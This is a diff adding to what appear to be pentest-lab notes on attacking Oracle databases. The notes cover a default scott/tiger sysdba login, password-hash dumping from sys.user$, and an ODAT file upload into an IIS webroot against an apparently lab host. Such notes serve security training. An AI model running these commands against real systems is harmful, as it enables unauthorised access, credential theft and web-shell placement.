@@ -11,6 +11,10 @@ listener.ora file is a server-side configuration file that defines the listener 
 
 $ORACLE_HOME/sqldeveloper - PL/SQL Exclusion List (PlsqlExclusionList)
 
+SQLPlus Commands: https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
+
+
+
 | Setting | Description |
 |---------|-------------|
 | `DESCRIPTION` | A descriptor that provides a name for the database and its connection type. |
@@ -35,7 +39,43 @@ $ORACLE_HOME/sqldeveloper - PL/SQL Exclusion List (PlsqlExclusionList)
 | `TRACE_FILE_NAME` | The name of the trace file. |
 | `LOG_FILE` | The file where the log information is stored. |
 
-odat setup
+
+
+
+activate venv
+`source .venv/bin/activate`
+
+sqlplus 
+```
+sudo apt install oracle-instantclient-sqlplus
+sqlplus -v
+
+# IF an error is thrown
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+
+sqlplus -v
+
+sqlplus scott/tiger@10.129.204.235/XE
+
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+enumeration
+```
+SQL> select table_name from all_tables;
+SQL> select * from user_role_privs;
+
+SQL> select name, password from sys.user$;
+```
+
+odat file upload
+```
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+curl -X GET http://10.129.204.235/testing.txt
+```
+
+odat setup script
 ```
 #!/usr/bin/env bash
 set -euo pipefail
